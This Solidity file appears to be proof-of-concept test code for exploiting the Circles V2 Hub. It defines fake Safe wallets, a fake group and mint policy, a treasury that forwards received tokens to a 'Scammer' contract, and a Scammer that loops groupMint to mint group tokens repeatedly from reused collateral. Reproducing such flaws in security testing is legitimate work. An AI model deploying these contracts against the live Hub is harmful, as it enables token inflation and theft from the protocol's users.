// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.28;
import {IHub, TypeDefinitions} from "test/helpers/CirclesV2Setup.sol";

contract FakeSafeAlwaysFalse {
    function isModuleEnabled(address) external view returns (bool) {
        return true;
    }

    function execTransactionFromModuleReturnData(address to, uint256 value, bytes memory data, uint8 operation)
        external
        returns (bool success, bytes memory returnData)
    {
        return (false, abi.encodePacked(msg.sender));
    }
}

// A fake safe that doesn't do the actual call but pass the check
contract FakeSafeAlwaysTrue {
    function isModuleEnabled(address) external view returns (bool) {
        return true;
    }

    function execTransactionFromModuleReturnData(address to, uint256 value, bytes memory data, uint8 operation)
        external
        returns (bool success, bytes memory returnData)
    {
        return (true, "0x");
    }

    function onERC1155Received(address, address from, uint256 id, uint256 value, bytes memory data)
        external
        returns (bytes4)
    {
        return this.onERC1155Received.selector;
    }
}

contract FakeTreasury {
    address scammer;
    IHub hub = IHub(0xc12C1E50ABB450d6205Ea2C3Fa861b3B834d13e8);

    constructor(address _scammer) {
        scammer = _scammer;
    }

    function onERC1155Received(address, address from, uint256 id, uint256 value, bytes memory data)
        external
        returns (bytes4)
    {
        hub.safeTransferFrom(address(this), scammer, id, value, data);
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address from,
        uint256[] memory ids,
        uint256[] memory values,
        bytes memory data
    ) external returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}

// Assumption: scammer is registered as human and fake group trust the scammer and has certain amount of CRC
contract Scammer {
    IHub hub = IHub(0xc12C1E50ABB450d6205Ea2C3Fa861b3B834d13e8);

    function trustExternal(address trustReceiver) public {
        hub.trust(trustReceiver, type(uint96).max);
    }

    function onERC1155Received(address, address from, uint256 id, uint256 value, bytes memory data)
        external
        returns (bytes4)
    {
        return this.onERC1155Received.selector;
    }

    function mintGroupToken(address _group, address _groupTreasury, uint256 _sendAmt, uint256 _loopAmt) public {
        // transfer _sendAmt amount of CRC trusted by group to start the loop process
        hub.safeTransferFrom(address(this), _groupTreasury, uint256(uint160(address(this))), _sendAmt, "0x");
        address[] memory collaterals = new address[](1);
        collaterals[0] = address(this);

        uint256[] memory values = new uint256[](1);
        values[0] = _sendAmt;
        for (uint256 i = 0; i < _loopAmt; i++) {
            hub.groupMint(_group, collaterals, values, "0x");
        }
    }
}

contract FakeMintPolicy {
    function beforeMintPolicy(
        address minter,
        address group,
        uint256[] calldata collateral,
        uint256[] calldata amounts,
        bytes calldata data
    ) external returns (bool) {
        return true;
    }
}

contract FakeSafeGroup {
    IHub hub = IHub(0xc12C1E50ABB450d6205Ea2C3Fa861b3B834d13e8);
    Scammer scammer;
    FakeTreasury fakeTreasury;
    FakeMintPolicy fakeMintPolicy;

    constructor(address _scammer, address _fakeTreasury, address _fakeMintPolicy) {
        scammer = Scammer(_scammer);
        fakeTreasury = FakeTreasury(_fakeTreasury);
        fakeMintPolicy = FakeMintPolicy(_fakeMintPolicy);
    }

    function isModuleEnabled(address) external view returns (bool) {
        return true;
    }

    // inviter is now trusting invitee, and hold 96 CRC (it's own CRC in direct invite mode)
    // is called when enforceHumanTrust from InvitationModule is called
    function execTransactionFromModuleReturnData(address to, uint256 value, bytes memory data, uint8 operation)
        external
        returns (bool success, bytes memory returnData)
    {
        hub.registerCustomGroup(address(fakeMintPolicy), address(fakeTreasury), "Fake group", "FG", bytes32(0));

        //   bytes memory data = abi.encodeWithSelector(IHub.registerHuman.selector, inviter, bytes32(0));

        // Make this group trust scammer so that it can receive scammer's personal CRC
        hub.trust(address(scammer), type(uint96).max);

        return (true, "0x");
    }

    function onERC1155Received(address, address from, uint256 id, uint256 value, bytes memory data)
        external
        returns (bytes4)
    {
        return this.onERC1155Received.selector;
    }
}
